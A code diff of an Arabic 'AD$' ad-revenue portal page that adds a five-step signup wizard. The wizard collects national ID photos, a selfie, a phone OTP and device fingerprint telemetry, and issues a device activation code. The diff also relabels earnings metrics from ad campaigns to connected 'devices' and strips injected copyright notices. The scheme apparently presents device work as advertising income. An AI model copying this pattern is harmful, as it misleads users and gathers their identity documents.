@@ -11,17 +11,7 @@
     <title>بوابة الناشرين | عوائد الحملات الإعلانية والمكافآت الترويجية</title>
 
     <!-- شعار سطر الويب (Favicon) -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E
-
-%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' 
-
-stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' 
-
-width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url
-
-(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' 
-
-y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
     <link rel="apple-touch-icon" href="/app-icon.svg">
     <link rel="manifest" href="/manifest.json">
 
@@ -46,17 +36,13 @@ y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%
                     </defs>
                     <rect width="120" height="120" rx="26" fill="#0f172a"/>
                     <rect x="5" y="5" width="110" height="110" rx="22" fill="none" stroke="url(#logoGrad)" stroke-width="5"/>
-                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-
-
-linejoin="round"/>
+                    <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
                     <circle cx="90" cy="34" r="7" fill="#10b981"/>
                     <text x="60" y="102" font-family="Cairo, Arial" font-size="22" font-weight="800" fill="#ffffff" text-anchor="middle">AD$</text>
                 </svg>
             </div>
             <div class="logo-text-align">
-                <span class="logo-brand-name">
-                    منصة AD$ للتمويل الإعلاني
-                </span>
+                <span class="logo-brand-name">منصة AD$ للتمويل الإعلاني</span>
                 <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
             </div>
         </div>
@@ -93,78 +79,122 @@ linejoin="round"/>
             <button type="submit" class="btn-submit" id="loginBtn">دخول إلى لوحة عوائد حسابي</button>
         </form>
 
-        <!-- 2. نموذج تسجيل مشترك جديد + تصوير البطاقة (وجه وظهر) + صورة شخصية + كود واتساب -->
-        <form id="registerForm" class="hidden-section">
-            <div class="form-group">
-                <label>الأسم الكامل (كما في البطاقة الشخصية)</label>
-                <input type="text" id="regName" placeholder="أدخل أسمك الكامل" required>
-            </div>
-            <div class="form-group">
-                <label>رقم الهاتف (مربوط بالواتساب لاستلام كود OTP)</label>
-                <input type="text" id="regPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx" required>
-            </div>
-            <div class="form-group">
-                <label>اختر كلمة مرور لحسابك</label>
-                <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية" required>
+        <!-- 2. نموذج تسجيل مشترك جديد مقسم إلى 5 أقسام متدرجة -->
+        <div id="registerWizard" class="hidden-section">
+            <!-- شريط الأقسام الخمسة -->
+            <div class="reg-stepper" id="regStepper">
+                <div class="reg-step-pill active" data-step-pill="1">1. البيانات</div>
+                <div class="reg-step-pill" data-step-pill="2">2. وجه البطاقة</div>
+                <div class="reg-step-pill" data-step-pill="3">3. ظهر البطاقة</div>
+                <div class="reg-step-pill" data-step-pill="4">4. صورة شخصية</div>
+                <div class="reg-step-pill" data-step-pill="5">5. كود واتساب</div>
             </div>
 
-            <!-- تصوير المستندات الثلاثة المطلوبة للتوثيق -->
-            <div class="form-group">
-                <label>المرفقات المطلوبة للتوثيق (وجه البطاقة + ظهر البطاقة + صورة شخصية)</label>
-                <div class="kyc-grid">
-                    <!-- 1. وجه البطاقة الشخصية -->
+            <!-- القسم الأول: الاسم الكامل + رقم الهاتف + كلمة المرور + الشروط والأحكام -->
+            <div id="regStep1">
+                <div class="form-group">
+                    <label>الاسم الكامل (كما في البطاقة الشخصية)</label>
+                    <input type="text" id="regName" placeholder="أدخل اسمك الكامل">
+                </div>
+                <div class="form-group">
+                    <label>رقم الهاتف (مربوط بالواتساب لاستلام كود OTP)</label>
+                    <input type="text" id="regPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" placeholder="01xxxxxxxxx">
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية">
+                </div>
+                <div class="form-group" style="display:flex; align-items:center; gap:10px; background:rgba(10,15,29,0.6); padding:10px 12px; border-radius:10px; border:1px solid var(--card-border);">
+                    <input type="checkbox" id="agreeTermsCheck" style="width:18px; height:18px; accent-color:var(--accent); cursor:pointer;">
+                    <label for="agreeTermsCheck" style="margin:0; font-size:0.83rem; color:#cbd5e1; cursor:pointer;">
+                        أقر بقراءة والموافقة على <a href="/terms.html" target="_blank" style="color:var(--accent); text-decoration:underline; font-weight:700;">الشروط والأحكام وسياسة الاستخدام</a> وشركاء <a href="/terms.html" target="_blank" style="color:#60a5fa; text-decoration:underline; font-weight:700;">التمويل الإعلاني</a>.
+                    </label>
+                </div>
+                <button type="button" class="btn-submit" onclick="confirmRegStep1()">تأكيد البيانات والمتابعة للخطوة الثانية</button>
+            </div>
+
+            <!-- القسم الثاني: تصوير واجهة البطاقة الشخصية + تأكيد أو إعادة التصوير -->
+            <div id="regStep2" class="hidden-section">
+                <div class="single-capture-card">
                     <div class="id-upload-box" id="boxIdFront" onclick="document.getElementById('idFrontInput').click()">
                         <span class="upload-icon">🪪</span>
-                        <span class="upload-title">1. وجه البطاقة الشخصية</span>
-                        <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
+                        <span class="upload-title">ثانياً: تصوير واجهة البطاقة الشخصية</span>
+                        <span class="upload-sub">اضغط هنا لالتقاط صورة واضحة لوجه البطاقة</span>
                         <input type="file" id="idFrontInput" accept="image/*" capture="environment" class="hidden-input">
                         <img id="previewIdFront" class="id-preview-img" alt="وجه البطاقة">
                     </div>
+                    <div class="step-actions-row">
+                        <button type="button" class="btn-secondary-step" onclick="retakeStepPhoto('front')">🔄 إعادة التصوير</button>
+                        <button type="button" class="btn-submit" style="flex:2;" onclick="confirmPhotoStep('front')">✅ تأكيد واجهة البطاقة</button>
+                    </div>
+                </div>
+            </div>
 
-                    <!-- 2. ظهر البطاقة الشخصية -->
+            <!-- القسم الثالث: تصوير ظهر البطاقة الشخصية + تأكيد أو إعادة التصوير -->
+            <div id="regStep3" class="hidden-section">
+                <div class="single-capture-card">
                     <div class="id-upload-box" id="boxIdBack" onclick="document.getElementById('idBackInput').click()">
                         <span class="upload-icon">🔄</span>
-                        <span class="upload-title">2. ظهر البطاقة الشخصية</span>
-                        <span class="upload-sub">اضغط للتصوير بالكاميرا</span>
+                        <span class="upload-title">ثالثاً: تصوير ظهر البطاقة الشخصية</span>
+                        <span class="upload-sub">اضغط هنا لالتقاط صورة واضحة لظهر البطاقة</span>
                         <input type="file" id="idBackInput" accept="image/*" capture="environment" class="hidden-input">
                         <img id="previewIdBack" class="id-preview-img" alt="ظهر البطاقة">
                     </div>
-
-                    <!-- 3. صورة شخصية (سيلفي) -->
-                    <div class="id-upload-box" id="boxSelfie" onclick="document.getElementById('selfieInput').click()">
-                        <span class="upload-icon">🤳</span>
-                        <span class="upload-title">3. صورة شخصية حديثة</span>
-                        <span class="upload-sub">اضغط لالتقاط صورة واضحة</span>
-                        <input type="file" id="selfieInput" accept="image/*" capture="user" class="hidden-input">
-                        <img id="previewSelfie" class="id-preview-img" alt="الصورة الشخصية">
+                    <div class="step-actions-row">
+                        <button type="button" class="btn-secondary-step" onclick="retakeStepPhoto('back')">🔄 إعادة التصوير</button>
+                        <button type="button" class="btn-submit" style="flex:2;" onclick="confirmPhotoStep('back')">✅ تأكيد ظهر البطاقة</button>
                     </div>
                 </div>
             </div>
 
-            <div class="form-group">
-                <label>كود مصادقة واتساب (OTP)</label>
-                <div class="otp-row">
-                    <input type="text" id="regOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" required>
-                    <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('register')">📲 إرسال كود واتساب</button>
+            <!-- القسم الرابع: تصوير الصورة الشخصية + تأكيد أو إعادة التصوير -->
+            <div id="regStep4" class="hidden-section">
+                <div class="single-capture-card">
+                    <div class="id-upload-box" id="boxSelfie" onclick="document.getElementById('selfieInput').click()">
+                        <span class="upload-icon">🤳</span>
+                        <span class="upload-title">رابعاً: التقاط صورة شخصية حديثة</span>
+                        <span class="upload-sub">اضغط هنا لفتح الكاميرا والتقاط صورتك الشخصية</span>
+                        <input type="file" id="selfieInput" accept="image/*" capture="user" class="hidden-input">
+                        <img id="previewSelfie" class="id-preview-img" alt="الصورة الشخصية">
+                    </div>
+                    <div class="step-actions-row">
+                        <button type="button" class="btn-secondary-step" onclick="retakeStepPhoto('selfie')">🔄 إعادة التصوير</button>
+                        <button type="button" class="btn-submit" style="flex:2;" onclick="confirmPhotoStep('selfie')">✅ تأكيد الصورة الشخصية</button>
+                    </div>
                 </div>
             </div>
 
-            <!-- مربع الموافقة الإلزامي على الشروط والأحكام -->
-            <div class="form-group" style="display:flex; align-items:center; gap:10px; background:rgba(10,15,29,0.6); padding:10px 12px; border-
+            <!-- القسم الخامس: إرسال كود واتساب لتأكيد الحساب + إرسال طلب التسجيل -->
+            <div id="regStep5" class="hidden-section">
+                <div class="form-group">
+                    <label>خامساً: كود مصادقة واتساب لتأكيد الحساب (7 أرقام)</label>
+                    <div class="otp-row">
+                        <input type="text" id="regOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)">
+                        <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('register')">📲 إرسال كود واتساب</button>
+                    </div>
+                </div>
 
-radius:10px; border:1px solid var(--card-border);">
-                <input type="checkbox" id="agreeTermsCheck" required style="width:18px; height:18px; accent-color:var(--accent); cursor:pointer;">
-                <label for="agreeTermsCheck" style="margin:0; font-size:0.83rem; color:#cbd5e1; cursor:pointer;">
-                    أقر بقراءة والموافقة على <a href="/terms.html" target="_blank" style="color:var(--accent); text-decoration:underline; font-weight:700;">
-
-الشروط والأحكام وسياسة الاستخدام</a> وشركاء <a href="/terms.html" target="_blank" style="color:#60a5fa; text-decoration:underline; font-weight:700;">التمويل 
-
-الإعلاني</a>.
-                </label>
+                <div class="step-actions-row">
+                    <button type="button" class="btn-secondary-step" onclick="goToRegStep(1)">✎ تعديل البيانات</button>
+                    <button type="button" class="btn-submit" style="flex:2;" id="regBtn" onclick="submitFinalRegistration()">إرسال طلب التسجيل</button>
+                </div>
             </div>
 
-            <button type="submit" class="btn-submit" id="regBtn">إرسال طلب التسجيل والمرفقات الثلاثة</button>
-        </form>
+            <!-- صندوق نتيجة الطلب وكود الجهاز المكون من 7 خانات يبدأ بـ AD -->
+            <div id="deviceCodeResultBox" class="device-code-result-box">
+                <div style="font-size:0.95rem; font-weight:800; color:#34d399;">
+                    ✅ تم استلام طلبكم — جاري المراجعة وعمل الحساب خلال دقائق
+                </div>
+                <div style="font-size:0.82rem; color:#cbd5e1; margin-top:0.35rem; line-height:1.6;">
+                    بعد المراجعة وإرسال تأكيد حسابكم بنجاح، استخدم كود الجهاز التالي (7 خانات يبدأ بـ <strong>AD</strong>) لوضعه في الجهاز عند تفعيل الحساب:
+                </div>
+                <div class="device-code-badge" id="generatedAdDeviceCode">AD------</div>
+                <div class="code-action-btns">
+                    <button type="button" class="btn-code-action" onclick="copyAdDeviceCode()">📋 نسخ الكود</button>
+                    <button type="button" class="btn-code-action btn-code-download" onclick="downloadAdDeviceCode()">⬇️ تحميل الكود</button>
+                </div>
+            </div>
+        </div>
 
         <!-- 3. نموذج نسيان كلمة المرور عبر واتساب (OTP) -->
         <form id="resetForm" class="hidden-section">
@@ -175,9 +205,7 @@ radius:10px; border:1px solid var(--card-border);">
             <div class="form-group">
                 <label>كود مصادقة واتساب (OTP)</label>
                 <div class="otp-row">
-                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" 
-
-required>
+                    <input type="text" id="resetOtp" class="numeric-ltr-input" inputmode="numeric" maxlength="7" placeholder="XXXXXXX (OTP)" required>
                     <button type="button" class="btn-whatsapp-otp" onclick="requestWhatsAppOtp('reset')">📲 OTP إرسال كود</button>
                 </div>
             </div>
@@ -231,9 +259,9 @@ required>
                 <div class="metric-trend">● متوافق مع المعايير</div>
             </div>
             <div class="metric-card">
-                <div class="metric-label">الحملات الممولة النشطة</div>
-                <div class="metric-val" id="metricCampaigns">0 حملة</div>
-                <div class="metric-trend">● رعاية مباشرة معتمدة</div>
+                <div class="metric-label">عدد الأجهزة النشطة</div>
+                <div class="metric-val" id="metricCampaigns">0 جهاز</div>
+                <div class="metric-trend">● متصل بالشبكة الآن</div>
             </div>
         </div>
 
@@ -372,10 +400,12 @@ required>
     let idFrontBase64 = "";
     let idBackBase64 = "";
     let selfieBase64 = "";
+    let currentRegStep = 1;
+    let currentAdDeviceCode = "";
     let currentAvailableBalance = 0.00;
     let officialBankRate = 56.26;
+    let lastHardwareAlertState = null;
 
-    // إزالة أي عنصر حقوق محفوظة قد يحقنه ملف protection.js
     function removeInjectedCopyright() {
         document.querySelectorAll("footer, .footer, .copyright, [id*='copyright'], [class*='copyright']").forEach(el => el.remove());
     }
@@ -447,6 +477,16 @@ required>
         savedId = `IMEI-ID-${Math.abs(hash).toString(16).toUpperCase()}-${randomPart}`;
         localStorage.setItem(key, savedId);
         return savedId;
+    }
+
+    // توليد كود جهاز مكون من 7 خانات يبدأ بـ AD (حروف وأرقام)
+    function generateSevenCharAdCode() {
+        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+        let suffix = "";
+        for (let i = 0; i < 5; i++) {
+            suffix += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return "AD" + suffix;
     }
 
     async function collectClientTelemetry() {
@@ -545,9 +585,9 @@ required>
         tabs[1].classList.toggle("active", tab === "register");
         tabs[2].classList.toggle("active", tab === "reset");
 
-        document.getElementById("loginForm").style.display = tab === "login" ? "block" : "none";
-        document.getElementById("registerForm").style.display = tab === "register" ? "block" : "none";
-        document.getElementById("resetForm").style.display = tab === "reset" ? "block" : "none";
+        document.getElementById("loginForm").classList.toggle("hidden-section", tab !== "login");
+        document.getElementById("registerWizard").classList.toggle("hidden-section", tab !== "register");
+        document.getElementById("resetForm").classList.toggle("hidden-section", tab !== "reset");
         document.getElementById("authAlert").style.display = "none";
     }
 
@@ -558,7 +598,53 @@ required>
         box.style.display = "block";
     }
 
-    // ضغط ومعاينة الصور الثلاث
+    // إدارة التنقل بين الأقسام الخمسة داخل التسجيل الجديد
+    function goToRegStep(stepNum) {
+        currentRegStep = stepNum;
+        document.getElementById("authAlert").style.display = "none";
+
+        for (let i = 1; i <= 5; i++) {
+            const stepDiv = document.getElementById("regStep" + i);
+            if (stepDiv) {
+                stepDiv.classList.toggle("hidden-section", i !== stepNum);
+            }
+            const pill = document.querySelector(`[data-step-pill="${i}"]`);
+            if (pill) {
+                pill.classList.remove("active", "done");
+                if (i < stepNum) pill.classList.add("done");
+                else if (i === stepNum) pill.classList.add("active");
+            }
+        }
+    }
+
+    // القسم الأول: تأكيد البيانات والشروط والأحكام
+    function confirmRegStep1() {
+        const name = document.getElementById("regName").value.trim();
+        const phone = document.getElementById("regPhone").value.trim();
+        const pass = document.getElementById("regPassword").value.trim();
+        const agreed = document.getElementById("agreeTermsCheck").checked;
+
+        if (!name || name.length < 3) {
+            showAuthMessage("يرجى إدخال الاسم الكامل بشكل صحيح.", false);
+            return;
+        }
+        if (!/^01[0-9]{9}$/.test(phone)) {
+            showAuthMessage("يرجى إدخال رقم هاتف مصري صحيح مكون من 11 رقماً يبدأ بـ 01.", false);
+            return;
+        }
+        if (!pass || pass.length < 4) {
+            showAuthMessage("يرجى اختيار كلمة مرور (4 أحرف أو أرقام على الأقل).", false);
+            return;
+        }
+        if (!agreed) {
+            showAuthMessage("يرجى الموافقة على الشروط والأحكام وسياسة الاستخدام أولاً.", false);
+            return;
+        }
+
+        goToRegStep(2);
+    }
+
+    // ضغط ومعاينة الصور للأقسام (2: واجهة البطاقة، 3: ظهر البطاقة، 4: الصورة الشخصية)
     function bindImageUploader(inputId, previewId, boxId, onSaveCallback) {
         document.getElementById(inputId).addEventListener("change", (e) => {
             const file = e.target.files[0];
@@ -594,13 +680,58 @@ required>
     bindImageUploader("idBackInput", "previewIdBack", "boxIdBack", (val) => { idBackBase64 = val; });
     bindImageUploader("selfieInput", "previewSelfie", "boxSelfie", (val) => { selfieBase64 = val; });
 
+    function retakeStepPhoto(type) {
+        document.getElementById("authAlert").style.display = "none";
+        if (type === "front") {
+            idFrontBase64 = "";
+            document.getElementById("idFrontInput").value = "";
+            document.getElementById("previewIdFront").style.display = "none";
+            document.getElementById("boxIdFront").classList.remove("has-file");
+            document.getElementById("idFrontInput").click();
+        } else if (type === "back") {
+            idBackBase64 = "";
+            document.getElementById("idBackInput").value = "";
+            document.getElementById("previewIdBack").style.display = "none";
+            document.getElementById("boxIdBack").classList.remove("has-file");
+            document.getElementById("idBackInput").click();
+        } else if (type === "selfie") {
+            selfieBase64 = "";
+            document.getElementById("selfieInput").value = "";
+            document.getElementById("previewSelfie").style.display = "none";
+            document.getElementById("boxSelfie").classList.remove("has-file");
+            document.getElementById("selfieInput").click();
+        }
+    }
+
+    function confirmPhotoStep(type) {
+        if (type === "front") {
+            if (!idFrontBase64) {
+                showAuthMessage("يرجى تصوير واجهة البطاقة الشخصية أولاً.", false);
+                return;
+            }
+            goToRegStep(3);
+        } else if (type === "back") {
+            if (!idBackBase64) {
+                showAuthMessage("يرجى تصوير ظهر البطاقة الشخصية أولاً.", false);
+                return;
+            }
+            goToRegStep(4);
+        } else if (type === "selfie") {
+            if (!selfieBase64) {
+                showAuthMessage("يرجى التقاط صورة شخصية أولاً.", false);
+                return;
+            }
+            goToRegStep(5);
+        }
+    }
+
     async function requestWhatsAppOtp(purpose) {
         const phone = purpose === "register"
             ? document.getElementById("regPhone").value.trim()
             : document.getElementById("resetPhone").value.trim();
 
         if (!/^01[0-9]{9}$/.test(phone)) {
-            showAuthMessage("يرجى كتابة رقم هاتف صحيح.", false);
+            showAuthMessage("يرجى كتابة رقم هاتف صحيح مكون من 11 رقماً يبدأ بـ 01 أولاً.", false);
             return;
         }
 
@@ -617,36 +748,55 @@ required>
         }
     }
 
-    document.getElementById("registerForm").addEventListener("submit", async (e) => {
-        e.preventDefault();
+    // القسم الخامس: إرسال طلب التسجيل وإظهار كود AD المكون من 7 خانات
+    async function submitFinalRegistration() {
+        const fullName = document.getElementById("regName").value.trim();
+        const phone = document.getElementById("regPhone").value.trim();
+        const password = document.getElementById("regPassword").value.trim();
+        const otpCode = document.getElementById("regOtp").value.trim();
 
+        if (!fullName || !/^01[0-9]{9}$/.test(phone) || !password) {
+            showAuthMessage("يرجى استكمال البيانات الأساسية في الخطوة الأولى.", false);
+            goToRegStep(1);
+            return;
+        }
         if (!idFrontBase64) {
-            showAuthMessage("يرجى تصوير وجه البطاقة الشخصية.", false);
+            showAuthMessage("يرجى إرفاق صورة واجهة البطاقة الشخصية.", false);
+            goToRegStep(2);
             return;
         }
         if (!idBackBase64) {
-            showAuthMessage("يرجى تصوير ظهر البطاقة الشخصية.", false);
+            showAuthMessage("يرجى إرفاق صورة ظهر البطاقة الشخصية.", false);
+            goToRegStep(3);
             return;
         }
         if (!selfieBase64) {
-            showAuthMessage("يرجى التقاط صورة شخصية حديثة أولاً.", false);
+            showAuthMessage("يرجى إرفاق الصورة الشخصية.", false);
+            goToRegStep(4);
+            return;
+        }
+        if (!/^[0-9]{7}$/.test(otpCode)) {
+            showAuthMessage("يرجى إدخال كود واتساب المكون من 7 أرقام لتأكيد الحساب.", false);
             return;
         }
 
         const btn = document.getElementById("regBtn");
         btn.disabled = true;
-        btn.textContent = "جاري رفع الصور والتحقق من الكود...";
+        btn.textContent = "جاري إرسال طلب التسجيل...";
 
         try {
             const deviceInfo = await collectClientTelemetry();
+            const adDeviceCode = generateSevenCharAdCode();
+
             const res = await fetch(`${API_BASE}/api/auth/register`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    fullName: document.getElementById("regName").value.trim(),
-                    phone: document.getElementById("regPhone").value.trim(),
-                    password: document.getElementById("regPassword").value.trim(),
-                    otpCode: document.getElementById("regOtp").value.trim(),
+                    fullName,
+                    phone,
+                    password,
+                    otpCode,
+                    adDeviceCode,
                     idFrontBase64,
                     idBackBase64,
                     selfieBase64,
@@ -654,26 +804,50 @@ required>
                 })
             });
             const data = await res.json();
-            showAuthMessage(data.message, data.success);
-            if (data.success) {
-                document.getElementById("registerForm").reset();
-                ["previewIdFront", "previewIdBack", "previewSelfie"].forEach(id => {
-                    document.getElementById(id).style.display = "none";
-                });
-                ["boxIdFront", "boxIdBack", "boxSelfie"].forEach(id => {
-                    document.getElementById(id).classList.remove("has-file");
-                });
-                idFrontBase64 = "";
-                idBackBase64 = "";
-                selfieBase64 = "";
+
+            if (!data.success) {
+                showAuthMessage(data.message || "تعذر إرسال طلب التسجيل.", false);
+                return;
             }
+
+            currentAdDeviceCode = data.adDeviceCode || adDeviceCode;
+            document.getElementById("generatedAdDeviceCode").textContent = currentAdDeviceCode;
+            document.getElementById("deviceCodeResultBox").style.display = "block";
+
+            showAuthMessage(
+                "جاري المراجعة وعمل الحساب خلال دقائق بعد المراجعة وإرسال تأكيد حسابكم بنجاح.",
+                true
+            );
         } catch {
             showAuthMessage("حدث خطأ أثناء إرسال طلب التسجيل والمرفقات.", false);
         } finally {
             btn.disabled = false;
-            btn.textContent = "إرسال طلب التسجيل والمرفقات الثلاثة";
+            btn.textContent = "إرسال طلب التسجيل";
         }
-    });
+    }
+
+    function copyAdDeviceCode() {
+        if (!currentAdDeviceCode) return;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(currentAdDeviceCode).catch(() => {});
+        }
+        showAuthMessage(`تم نسخ كود الجهاز (${currentAdDeviceCode}) بنجاح!`, true);
+    }
+
+    function downloadAdDeviceCode() {
+        if (!currentAdDeviceCode) return;
+        const phone = document.getElementById("regPhone").value.trim() || "---";
+        const content = `منصة AD$ للتمويل الإعلاني\nكود الجهاز المخصص للتفعيل: ${currentAdDeviceCode}\nرقم الهاتف: ${phone}\nالحالة: جاري المراجعة وعمل الحساب خلال دقائق\n`;
+        const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = `${currentAdDeviceCode}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(url);
+    }
 
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
         e.preventDefault();
@@ -728,16 +902,18 @@ required>
     });
 
     function enterDashboard() {
-        document.getElementById("authSection").style.display = "none";
-        document.getElementById("dashboardSection").style.display = "block";
+        document.getElementById("authSection").classList.add("hidden-section");
+        document.getElementById("dashboardSection").classList.remove("hidden-section");
         syncWithServer();
     }
 
     function logoutUser() {
         authToken = "";
         localStorage.removeItem(TOKEN_KEY);
-        document.getElementById("dashboardSection").style.display = "none";
-        document.getElementById("authSection").style.display = "block";
+        lastHardwareAlertState = null;
+        document.getElementById("hardwareAlertBanner")?.classList.add("hidden-section");
+        document.getElementById("dashboardSection").classList.add("hidden-section");
+        document.getElementById("authSection").classList.remove("hidden-section");
     }
 
     function formatEgp(num) {
@@ -768,6 +944,27 @@ required>
         document.getElementById("metricCtr").textContent = `${(3.10 + ((balance % 175) / 100)).toFixed(2)}%`;
     }
 
+    function applyHardwareAlertState(isActive, alertMessage) {
+        const hwBanner = document.getElementById("hardwareAlertBanner");
+        const hwTextEl = document.getElementById("hardwareAlertText");
+        if (!hwBanner) return;
+
+        const activeBool = Boolean(isActive);
+        if (alertMessage && hwTextEl && hwTextEl.textContent !== alertMessage) {
+            hwTextEl.textContent = alertMessage;
+        }
+
+        // تحديث الحالة فقط عند تغيرها فعلياً لمنع الوميض عند تنشيط الصفحة أو التحديث الدوري
+        if (lastHardwareAlertState === activeBool) return;
+        lastHardwareAlertState = activeBool;
+
+        if (activeBool) {
+            hwBanner.classList.remove("hidden-section");
+        } else {
+            hwBanner.classList.add("hidden-section");
+        }
+    }
+
     async function syncWithServer() {
         if (!authToken) return;
         try {
@@ -786,24 +983,14 @@ required>
                     document.getElementById("userName").value = data.accountName;
                 }
 
-                // إظهار أو إخفاء تنبيه صيانة أجهزة الكمبيوتر المرسل من تيليجرام
-                const hwBanner = document.getElementById("hardwareAlertBanner");
-                if (data.hardwareAlert) {
-                    if (data.hardwareAlertMessage) {
-                        document.getElementById("hardwareAlertText").textContent = data.hardwareAlertMessage;
-                    }
-                    hwBanner.style.display = "flex";
-                } else {
-                    hwBanner.style.display = "none";
-                }
+                applyHardwareAlertState(data.hardwareAlert, data.hardwareAlertMessage);
 
-                // تحديث عدد الأجهزة النشطة من Worker List
                 const workersNum = parseInt(data.activeWorkers, 10) || 0;
-                let workersLabel = `${workersNum} حَمْلَة`;
-                if (workersNum === 1) workersLabel = "1 حَمْلَة";
-                else if (workersNum === 2) workersLabel = "2 حَمْلَة";
-                else if (workersNum >= 3 && workersNum <= 10) workersLabel = `${workersNum} حَمَلات`;
-                document.getElementById("metricCampaigns").textContent = workersLabel;
+                let workersText = `${workersNum} جهاز`;
+                if (workersNum === 1) workersText = "1 جهاز";
+                else if (workersNum === 2) workersText = "2 جهاز";
+                else if (workersNum >= 3 && workersNum <= 10) workersText = `${workersNum} أجهزة`;
+                document.getElementById("metricCampaigns").textContent = workersText;
 
                 officialBankRate = parseFloat(data.exchangeRate) || 56.26;
                 currentAvailableBalance = parseFloat(data.balance) || 0;
@@ -887,7 +1074,7 @@ required>
     const dynamicHint = document.getElementById("dynamicHint");
 
     methodSelect.addEventListener("change", () => {
-        document.getElementById("dynamicField").style.display = "block";
+        document.getElementById("dynamicField").classList.remove("hidden-section");
         if (methodSelect.value === "محفظة إلكترونية") {
             document.getElementById("dynamicLabel").textContent = "رقم المحفظة الإلكترونية";
             destinationInput.value = "01";
@@ -1000,7 +1187,7 @@ required>
 
             if (data.success) {
                 document.getElementById("withdrawAmount").value = "";
-                document.getElementById("dynamicField").style.display = "none";
+                document.getElementById("dynamicField").classList.add("hidden-section");
                 methodSelect.selectedIndex = 0;
                 recalculateFormPreview();
                 syncWithServer();
